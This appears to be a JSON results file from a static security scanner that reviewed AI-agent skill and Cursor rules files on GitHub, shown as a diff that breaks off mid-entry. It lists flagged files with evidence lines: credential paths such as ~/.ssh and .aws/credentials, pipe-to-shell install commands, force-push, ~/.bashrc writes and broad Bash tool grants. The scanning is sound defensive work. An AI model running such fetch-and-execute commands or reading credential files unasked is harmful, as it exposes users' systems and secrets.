@@ -1,0 +1,4710 @@
+{
+  "generatedAt": "2026-07-26T08:09:02.265Z",
+  "engine": "text-baseline/v2",
+  "scanned": 11014,
+  "flagged": 139,
+  "byLevel": {
+    "clean": 10875,
+    "low": 105,
+    "medium": 33,
+    "high": 1
+  },
+  "note": "静态文本匹配基线,用于筛出需人工复核的条目,不构成终审判决",
+  "entries": [
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/aws-cli.mdc#aws-cli",
+      "name": "aws-cli",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/aws-cli.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/aws-cli.mdc",
+      "level": "high",
+      "score": 50,
+      "counts": {
+        "medium": 2,
+        "high": 2
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 136,
+          "evidence": ".aws/credentials"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "high",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 141,
+          "evidence": ".aws/credentials"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "high",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 152,
+          "evidence": ".aws/credentials"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 163,
+          "evidence": ".aws/credentials"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/workflow-automation/gitops-workflow/skill.md#gitops-workflow",
+      "name": "gitops-workflow",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/workflow-automation/gitops-workflow/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/workflow-automation/gitops-workflow/SKILL.md",
+      "level": "medium",
+      "score": 29,
+      "counts": {
+        "high": 1,
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "remote-code-exec",
+          "severity": "high",
+          "title": {
+            "zh": "远程脚本直接执行",
+            "en": "Pipe-to-shell remote execution"
+          },
+          "where": "body",
+          "line": 134,
+          "evidence": "curl -s https://fluxcd.io/install.sh | sudo bash"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 134,
+          "evidence": "curl -s https://fluxcd.io/install.sh"
+        }
+      ]
+    },
+    {
+      "id": "skill:xu-xiang/everything-claude-code-zh:skills/autonomous-loops/skill.md#autonomous-loops",
+      "name": "autonomous-loops",
+      "type": "skill",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "skills/autonomous-loops/SKILL.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/skills/autonomous-loops/SKILL.md",
+      "level": "medium",
+      "score": 29,
+      "counts": {
+        "high": 1,
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "remote-code-exec",
+          "severity": "high",
+          "title": {
+            "zh": "远程脚本直接执行",
+            "en": "Pipe-to-shell remote execution"
+          },
+          "where": "body",
+          "line": 229,
+          "evidence": "curl -fsSL https://raw.githubusercontent.com/AnandChowdhary/continuous-claude/HEAD/install.sh | bash"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 229,
+          "evidence": "curl -fsSL https://raw.githubusercontent.com/AnandChowdhary/continuous-claude/HEAD/install.sh"
+        }
+      ]
+    },
+    {
+      "id": "skill:huangwb8/skills:awesome-code/skill.md#awesome-code",
+      "name": "awesome-code",
+      "type": "skill",
+      "repo": "huangwb8/skills",
+      "path": "awesome-code/SKILL.md",
+      "url": "https://github.com/huangwb8/skills/blob/HEAD/awesome-code/SKILL.md",
+      "level": "medium",
+      "score": 27,
+      "counts": {
+        "medium": 3
+      },
+      "flags": [
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "script",
+          "line": 433,
+          "evidence": ".npmrc"
+        },
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "script",
+          "line": 537,
+          "evidence": ".npmrc"
+        },
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "script",
+          "line": 615,
+          "evidence": ".npmrc"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/ai-research/fine-tuning-unsloth/skill.md#unsloth",
+      "name": "unsloth",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/ai-research/fine-tuning-unsloth/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/ai-research/fine-tuning-unsloth/SKILL.md",
+      "level": "medium",
+      "score": 25,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "high",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 68,
+          "evidence": " Trigger re-upload 1763621536 "
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/productivity/mac-storage-cleaner/skill.md#mac-storage-cleaner",
+      "name": "mac-storage-cleaner",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/productivity/mac-storage-cleaner/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/productivity/mac-storage-cleaner/SKILL.md",
+      "level": "medium",
+      "score": 25,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "high",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 127,
+          "evidence": "~/.ssh"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/environment-setup-guide/skill.md#environment-setup-guide",
+      "name": "environment-setup-guide",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/environment-setup-guide/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/environment-setup-guide/SKILL.md",
+      "level": "medium",
+      "score": 25,
+      "counts": {
+        "medium": 1,
+        "low": 5
+      },
+      "flags": [
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "body",
+          "line": 50,
+          "evidence": ".npmrc"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 238,
+          "evidence": "http://127.0.0.1:5000"
+        },
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 160,
+          "evidence": ">> ~/.bashrc"
+        },
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 386,
+          "evidence": ">> ~/.bashrc"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 79,
+          "evidence": "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 258,
+          "evidence": "curl -fsSL https://get.docker.com -o get-docker.sh"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/github-workflow-automation/skill.md#github-workflow-automation",
+      "name": "github-workflow-automation",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/github-workflow-automation/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/github-workflow-automation/SKILL.md",
+      "level": "medium",
+      "score": 25,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "destructive-ops",
+          "severity": "high",
+          "title": {
+            "zh": "破坏性操作",
+            "en": "Destructive operation"
+          },
+          "where": "body",
+          "line": 533,
+          "evidence": "git push --force"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/workflow-automation/github-workflow-automation/skill.md#github-workflow-automation",
+      "name": "github-workflow-automation",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/workflow-automation/github-workflow-automation/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/workflow-automation/github-workflow-automation/SKILL.md",
+      "level": "medium",
+      "score": 25,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "destructive-ops",
+          "severity": "high",
+          "title": {
+            "zh": "破坏性操作",
+            "en": "Destructive operation"
+          },
+          "where": "body",
+          "line": 533,
+          "evidence": "git push --force"
+        }
+      ]
+    },
+    {
+      "id": "rules:patrickjs/awesome-cursorrules:rules/semiotic-react-dataviz-cursorrules-prompt-file.mdc#semiotic-react-dataviz-cursorrules-prompt-file",
+      "name": "semiotic-react-dataviz-cursorrules-prompt-file",
+      "type": "rules",
+      "repo": "PatrickJS/awesome-cursorrules",
+      "path": "rules/semiotic-react-dataviz-cursorrules-prompt-file.mdc",
+      "url": "https://github.com/PatrickJS/awesome-cursorrules/blob/HEAD/rules/semiotic-react-dataviz-cursorrules-prompt-file.mdc",
+      "level": "medium",
+      "score": 25,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "secret-in-url",
+          "severity": "high",
+          "title": {
+            "zh": "密钥被拼进 URL",
+            "en": "Secret interpolated into URL"
+          },
+          "where": "body",
+          "line": 89,
+          "evidence": "https://api.mapbox.com/styles/v1/mapbox/light-v11/tiles/{z}/{x}/{y}?access_token=\\${process.env.MAPBOX_TOKEN}\\"
+        }
+      ]
+    },
+    {
+      "id": "skill:beshkenadze/claude-skills-marketplace:skills/utility/safe-rm/skill.md#safe-rm",
+      "name": "safe-rm",
+      "type": "skill",
+      "repo": "beshkenadze/claude-skills-marketplace",
+      "path": "skills/utility/safe-rm/SKILL.md",
+      "url": "https://github.com/beshkenadze/claude-skills-marketplace/blob/HEAD/skills/utility/safe-rm/SKILL.md",
+      "level": "medium",
+      "score": 25,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "high",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 31,
+          "evidence": "~/.ssh"
+        }
+      ]
+    },
+    {
+      "id": "skill:beshkenadze/claude-skills-marketplace:skills/development/zamokctl/skill.md#zamokctl",
+      "name": "zamokctl",
+      "type": "skill",
+      "repo": "beshkenadze/claude-skills-marketplace",
+      "path": "skills/development/zamokctl/SKILL.md",
+      "url": "https://github.com/beshkenadze/claude-skills-marketplace/blob/HEAD/skills/development/zamokctl/SKILL.md",
+      "level": "medium",
+      "score": 25,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "high",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 17,
+          "evidence": "login keychain"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/creative-design/mobile-design/skill.md#mobile-design",
+      "name": "mobile-design",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/creative-design/mobile-design/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/creative-design/mobile-design/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/lint-and-validate/skill.md#lint-and-validate",
+      "name": "lint-and-validate",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/lint-and-validate/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/lint-and-validate/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/performance-profiling/skill.md#performance-profiling",
+      "name": "performance-profiling",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/performance-profiling/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/performance-profiling/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/productivity/planning-with-files/skill.md#planning-with-files",
+      "name": "planning-with-files",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/productivity/planning-with-files/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/productivity/planning-with-files/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/citation-management/skill.md#citation-management",
+      "name": "citation-management",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/citation-management/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/citation-management/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/clinical-decision-support/skill.md#clinical-decision-support",
+      "name": "clinical-decision-support",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/clinical-decision-support/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/clinical-decision-support/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/clinical-reports/skill.md#clinical-reports",
+      "name": "clinical-reports",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/clinical-reports/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/clinical-reports/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/latex-posters/skill.md#latex-posters",
+      "name": "latex-posters",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/latex-posters/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/latex-posters/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/literature-review/skill.md#literature-review",
+      "name": "literature-review",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/literature-review/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/literature-review/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/market-research-reports/skill.md#market-research-reports",
+      "name": "market-research-reports",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/market-research-reports/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/market-research-reports/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/markitdown/skill.md#markitdown",
+      "name": "markitdown",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/markitdown/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/markitdown/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/research-lookup/skill.md#research-lookup",
+      "name": "research-lookup",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/research-lookup/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/research-lookup/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/scientific-schematics/skill.md#scientific-schematics",
+      "name": "scientific-schematics",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/scientific-schematics/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/scientific-schematics/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/scientific-slides/skill.md#scientific-slides",
+      "name": "scientific-slides",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/scientific-slides/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/scientific-slides/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/treatment-plans/skill.md#treatment-plans",
+      "name": "treatment-plans",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/treatment-plans/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/treatment-plans/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/venue-templates/skill.md#venue-templates",
+      "name": "venue-templates",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/venue-templates/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/venue-templates/SKILL.md",
+      "level": "medium",
+      "score": 21,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/render-deploy/skill.md#render-deploy",
+      "name": "render-deploy",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/render-deploy/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/render-deploy/SKILL.md",
+      "level": "medium",
+      "score": 20,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "remote-code-exec",
+          "severity": "medium",
+          "title": {
+            "zh": "远程脚本直接执行",
+            "en": "Pipe-to-shell remote execution"
+          },
+          "where": "body",
+          "line": 107,
+          "evidence": "curl -fsSL https://raw.githubusercontent.com/render-oss/cli/main/bin/install.sh | sh"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "medium",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 107,
+          "evidence": "curl -fsSL https://raw.githubusercontent.com/render-oss/cli/main/bin/install.sh"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/utilities/busybox-on-windows/skill.md#busybox-on-windows",
+      "name": "busybox-on-windows",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/utilities/busybox-on-windows/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/utilities/busybox-on-windows/SKILL.md",
+      "level": "medium",
